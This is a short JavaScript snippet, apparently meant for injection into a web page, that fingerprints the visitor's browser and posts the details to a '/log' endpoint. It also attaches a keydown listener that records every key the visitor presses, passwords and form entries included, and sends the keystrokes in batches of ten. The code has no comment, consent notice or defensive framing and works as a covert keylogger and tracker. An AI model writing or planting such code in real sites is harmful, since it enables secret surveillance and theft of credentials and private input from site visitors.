(function() {
  const info = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenWidth: screen.width,
    screenHeight: screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    online: navigator.onLine,
    cookiesEnabled: navigator.cookieEnabled,
    plugins: Array.from(navigator.plugins).map(p => p.name),
    timing: performance.timing ? {
      navigationStart: performance.timing.navigationStart,
      loadEventEnd: performance.timing.loadEventEnd
    } : {},
  };

  fetch('/log', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({type: 'info', data: info})
  });

  let keys = '';
  document.addEventListener('keydown', (e) => {
    keys += e.key;
    if (keys.length >= 10) {
      fetch('/log', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({type: 'keys', keys: keys})
      });
      keys = '';
    }
  });

  window.addEventListener('beforeunload', () => {
    const timeSpent = Date.now() - info.timing.navigationStart;
    navigator.sendBeacon('/log', JSON.stringify({
      type: 'timespent',
      milliseconds: timeSpent
    }));
  });
})();
